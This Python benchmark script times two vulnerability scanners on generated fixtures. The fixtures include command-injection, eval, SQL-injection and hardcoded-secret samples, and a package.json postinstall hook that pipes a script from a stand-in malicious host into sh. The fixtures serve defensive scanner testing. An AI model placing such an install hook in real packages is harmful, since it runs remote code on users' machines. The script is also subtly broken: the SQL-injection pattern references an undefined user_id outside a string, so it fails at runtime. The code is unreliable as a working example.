#!/usr/bin/env python3
"""Performance benchmark script for MCP Sentinel Scanner."""

import time
from pathlib import Path
from typing import Dict

from src.mcp_sentinel_scanner import MCPSentinelScanner
from src.unified_scanner import UnifiedScanner


def benchmark_scanner(scanner, target: Path, name: str) -> Dict[str, float]:
    """Benchmark a scanner and return performance metrics."""
    print(f"\n🔍 Benchmarking {name}...")

    start_time = time.perf_counter()
    start_memory = get_memory_usage()

    try:
        result = scanner.scan(target)

        end_time = time.perf_counter()
        end_memory = get_memory_usage()

        duration = end_time - start_time
        memory_used = end_memory - start_memory

        print(f"✅ {name} completed successfully")
        print(f"   Duration: {duration:.2f}s")
        print(f"   Files scanned: {result.summary.files_scanned}")
        print(f"   Vulnerabilities: {result.summary.vulnerabilities_found}")
        print(f"   Scan speed: {result.summary.files_scanned/duration:.1f} files/sec")
        print(f"   Memory used: {memory_used:.1f} MB")

        return {
            "duration": duration,
            "files_scanned": result.summary.files_scanned,
            "vulnerabilities_found": result.summary.vulnerabilities_found,
            "scan_speed": result.summary.files_scanned / duration,
            "memory_used": memory_used,
            "asr_score": result.summary.asr_score,
        }

    except Exception as e:
        print(f"❌ {name} failed: {e}")
        return {"error": str(e)}


def get_memory_usage() -> float:
    """Get current memory usage in MB."""
    try:
        import psutil

        process = psutil.Process()
        return process.memory_info().rss / 1024 / 1024
    except ImportError:
        return 0.0


def create_test_files(base_path: Path, num_files: int = 50) -> Path:
    """Create test files for benchmarking."""
    test_dir = base_path / "benchmark_test_files"
    test_dir.mkdir(exist_ok=True)

    # Create various file types with different vulnerability patterns
    patterns = [
        "# Clean file\nprint('Hello World')",
        "import os\nos.system('echo test')",  # Command injection
        "password = 'hardcoded-secret-123456789'",  # Hardcoded secret
        "eval(user_input)",  # Dangerous function
        "SELECT * FROM users WHERE id = '" + user_id + "'",  # SQL injection
    ]

    for i in range(num_files):
        file_path = test_dir / f"test_file_{i}.py"
        pattern = patterns[i % len(patterns)]
        file_path.write_text(f"# Test file {i}\n{pattern}\n")

    # Create React files
    react_dir = test_dir / "react_components"
    react_dir.mkdir(exist_ok=True)

    react_patterns = [
        "function Component() { return <div>Clean</div>; }",
        "function Component({html}) { return <div dangerouslySetInnerHTML={{__html: html}} />; }",
        "const API_KEY = 'sk-1234567890abcdef';",
        "localStorage.setItem('token', jwt);",
    ]

    for i, pattern in enumerate(react_patterns):
        file_path = react_dir / f"Component{i}.jsx"
        file_path.write_text(pattern)

    # Create package.json
    package_json = test_dir / "package.json"
    package_json.write_text(
        """{
        "name": "test-project",
        "dependencies": {
            "@internal/secret-package": "1.0.0"
        },
        "scripts": {
            "postinstall": "curl http://malicious.com/script.sh | sh"
        }
    }"""
    )

    return test_dir


def run_benchmarks():
    """Run comprehensive benchmarks."""
    print("🚀 MCP Sentinel Scanner Performance Benchmark")
    print("=" * 50)

    # Create test files
    test_dir = create_test_files(Path("."))
    print(f"📁 Created test files in: {test_dir}")

    # Initialize scanners
    mcp_scanner = MCPSentinelScanner()
    unified_scanner = UnifiedScanner()

    # Run benchmarks
    results = {}

    # Benchmark MCP Scanner
    results["mcp"] = benchmark_scanner(mcp_scanner, test_dir, "MCP Scanner")

    # Benchmark Unified Scanner
    results["unified"] = benchmark_scanner(unified_scanner, test_dir, "Unified Scanner")

    # Compare results
    print("\n📊 Performance Comparison")
    print("=" * 50)

    if "error" not in results["mcp"] and "error" not in results["unified"]:
        mcp_speed = results["mcp"]["scan_speed"]
        unified_speed = results["unified"]["scan_speed"]

        print(f"MCP Scanner:     {mcp_speed:.1f} files/sec")
        print(f"Unified Scanner: {unified_speed:.1f} files/sec")

        if unified_speed > mcp_speed:
            improvement = (unified_speed - mcp_speed) / mcp_speed * 100
            print(f"🚀 Unified Scanner is {improvement:.1f}% faster")
        else:
            degradation = (mcp_speed - unified_speed) / mcp_speed * 100
            print(f"⚠️  Unified Scanner is {degradation:.1f}% slower")

        # Memory comparison
        mcp_memory = results["mcp"]["memory_used"]
        unified_memory = results["unified"]["memory_used"]

        print(f"\nMemory Usage:")
        print(f"MCP Scanner:     {mcp_memory:.1f} MB")
        print(f"Unified Scanner: {unified_memory:.1f} MB")

        # Vulnerability detection comparison
        mcp_vulns = results["mcp"]["vulnerabilities_found"]
        unified_vulns = results["unified"]["vulnerabilities_found"]

        print(f"\nVulnerabilities Found:")
        print(f"MCP Scanner:     {mcp_vulns}")
        print(f"Unified Scanner: {unified_vulns}")

        if unified_vulns > mcp_vulns:
            improvement = unified_vulns - mcp_vulns
            print(f"🎯 Unified Scanner found {improvement} additional vulnerabilities")

    # Performance targets
    print("\n🎯 Performance Targets")
    print("=" * 50)
    print("Target: <60s for 10K LOC")
    print("Target: <512MB memory usage")
    print("Target: >50 files/sec scan speed")

    # Cleanup
    import shutil

    shutil.rmtree(test_dir)
    print(f"\n🧹 Cleaned up test files")


if __name__ == "__main__":
    run_benchmarks()
